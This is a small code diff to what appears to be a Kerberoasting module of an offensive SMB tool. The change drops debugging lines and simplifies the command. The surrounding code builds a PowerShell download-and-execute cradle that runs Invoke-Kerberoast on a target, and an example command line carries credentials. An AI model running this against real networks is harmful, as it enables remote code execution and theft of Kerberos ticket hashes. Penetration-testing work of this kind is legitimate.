@@ -34,7 +34,7 @@ cmx --verbose smb 192.168.1.1 -u username -p password -M kerberoast -mo '-Creden
         self.ps_script = clean_ps_script('powershell_scripts/Invoke-Kerberoast.ps1')
 
     def on_admin_login(self, context, connection):
-        command = "Invoke-Kerberoast | fl | Out-String"
+        command = "Invoke-Kerberoast"
 
         launcher = gen_ps_iex_cradle(context, 'Invoke-Kerberoast.ps1', command, server_os=connection.server_os)
 
@@ -57,15 +57,12 @@ cmx --verbose smb 192.168.1.1 -u username -p password -M kerberoast -mo '-Creden
         response.end_headers()
         length = int(response.headers.get('Content-Length'))
         data = response.rfile.read(length)
-        pdb.set_trace()
 
         # We've received the response, stop tracking this host
         response.stop_tracking_host()
 
         if len(data):
-            #buf = StringIO(data).readlines()
             lines = data.decode().split("             ")
-            #pdb.set_trace() #stuff = iter(data.decode().split())    for thing in stuff: print(thing) 
             for line in lines:
                 #line = line.replace('\r\n', '\n').strip()
                 context.log.highlight(line)
